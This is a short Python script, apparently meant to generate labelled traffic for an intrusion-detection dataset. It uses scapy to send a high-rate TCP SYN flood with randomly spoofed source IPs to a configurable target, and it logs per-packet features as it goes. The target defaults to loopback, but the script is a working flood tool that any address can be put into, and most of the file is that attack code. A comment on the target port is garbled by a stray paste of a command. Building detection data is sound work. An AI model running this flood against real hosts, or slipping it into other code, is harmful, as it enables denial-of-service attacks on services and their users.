import time
import pandas as pd
import random
import threading
from scapy.all import sendp, IP, TCP, RandIP, Ether, conf

# === Configuration ===
TARGET_IP = "127.0.0.1"  # Loopback for local testing
TARGET_PORT = 80             # Change this to the targpython your_script.py
PACKETS_PER_SECOND = 10000    # Adjust attack intensity
DURATION = 20                # Attack duration in seconds



# Set the network interface (your Wi-Fi interface)
conf.iface = "\\Device\\NPF_{B8AB59E1-CF66-43D2-9F95-6222ECA94273}"  # Use your correct interface ID

# === Feature Columns Matching Dataset ===
columns = [
    "Source IP", "Destination IP", "Dst Port", "Protocol", "Timestamp", 
    "Tot Fwd Pkts", "Tot Bwd Pkts", "TotLen Fwd Pkts", "TotLen Bwd Pkts",
    "Fwd Pkt Len Max", "Fwd Pkt Len Min", "Flow Duration"
]

# === Data Storage ===
ddos_data = []

# === DDoS Traffic Generator Function ===
def ddos_attack():
    print("Starting fake DDoS....")
    start_time = time.time()

    while time.time() - start_time < DURATION:
        for _ in range(PACKETS_PER_SECOND):
            src_ip = str(RandIP())  # Generate random source IP
            timestamp = time.time()
            packet_size = random.randint(40, 1500)  # Random packet size
            flow_duration = random.randint(100, 5000)  # Random flow duration
            
            # Create SYN flood packet with Ethernet header
            packet = Ether() / IP(src=src_ip, dst=TARGET_IP) / TCP(dport=TARGET_PORT, flags="S")
            sendp(packet, iface=conf.iface, verbose=False)  # Send via Wi-Fi

            # Save features for logging
            ddos_data.append([
                src_ip, TARGET_IP, TARGET_PORT, 6, timestamp, 
                1, 0, packet_size, 0,
                packet_size, packet_size, flow_duration
            ])

    print("DDoS attack simulation completed.")

# === Run Attack in a Separate Thread ===
attack_thread = threading.Thread(target=ddos_attack)
attack_thread.start()
attack_thread.join()


